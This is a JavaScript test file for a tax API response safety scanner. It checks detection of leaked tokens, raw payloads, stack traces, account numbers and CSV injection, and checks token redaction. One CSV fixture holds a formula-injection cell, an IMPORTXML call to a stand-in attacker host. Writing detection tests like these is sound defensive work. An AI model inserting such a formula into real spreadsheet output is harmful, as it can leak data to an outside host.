import test from "node:test";
import assert from "node:assert/strict";
import {
  redact,
  runStaticTaxOutputSafetyScan,
  scanTaxApiError,
  scanTaxResponseSafety,
} from "../src/services/tax/security/taxResponseSafetyScanner.js";

test("Tax response scanner detects token-like values and redacts previews", () => {
  const result = scanTaxResponseSafety({
    name: "token_response",
    body: {
      ok: false,
      message: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abcdefghijklmnop.qrstuvwxyz123456",
    },
  });
  assert.equal(result.safe, false);
  assert.ok(result.findings.some((finding) => finding.category === "credentials"));
  assert.doesNotMatch(JSON.stringify(result.findings), /abcdefghijklmnop/);
});

test("Tax response scanner detects sensitive property names and raw payload markers", () => {
  const result = scanTaxResponseSafety({
    body: {
      data: {
        qbo_posted_transactions: {
          payload: { private: "raw source payload" },
        },
      },
    },
  });
  assert.equal(result.safe, false);
  assert.ok(result.findings.some((finding) => finding.category === "raw_source_payload"));
});

test("Tax response scanner detects stack traces, SQL internals, and filesystem paths", () => {
  const result = scanTaxResponseSafety({
    body: "Error: relation \"public.tax_profiles\" does not exist\n    at handler (/Users/patrick/project/src/api/tax.js:1:2)",
  });
  assert.equal(result.safe, false);
  assert.ok(result.findings.some((finding) => finding.category === "internal_implementation"));
});

test("Tax response scanner detects full account and routing-like identifiers but allows masked values", () => {
  const unsafe = scanTaxResponseSafety({ body: { accountNumber: "123456789012" } });
  const safe = scanTaxResponseSafety({ body: { accountMask: "6789", accountLabel: "Checking ending in 6789" } });
  assert.equal(unsafe.safe, false);
  assert.equal(safe.safe, true);
});

test("Tax response scanner detects unsafe CSV formula cells", () => {
  const result = scanTaxResponseSafety({
    filename: "tax.csv",
    contentType: "text/csv",
    body: "vendor,amount\n=IMPORTXML(\"https://evil.example\"),10\n",
  });
  assert.equal(result.safe, false);
  assert.ok(result.findings.some((finding) => finding.category === "csv_injection"));
});

test("Tax API errors sanitize bearer tokens before scanner receives them", () => {
  const error = {
    name: "ApiRequestError",
    code: "server_error",
    message: "Network request failed.",
    details: "Bearer [redacted]",
    status: 500,
  };
  const result = scanTaxApiError(error);
  assert.equal(result.safe, true);
});

test("Tax static output scan runs and distinguishes static findings from runtime proof", () => {
  const report = runStaticTaxOutputSafetyScan({ root: process.cwd() });
  assert.ok(["pass", "fail"].includes(report.status));
  assert.ok(Array.isArray(report.findings));
});

test("redact removes common token forms", () => {
  const text = redact("Authorization: Bearer abcdefghijklmnopqrstuvwxyz0123456789");
  assert.doesNotMatch(text, /abcdefghijklmnopqrstuvwxyz/);
});
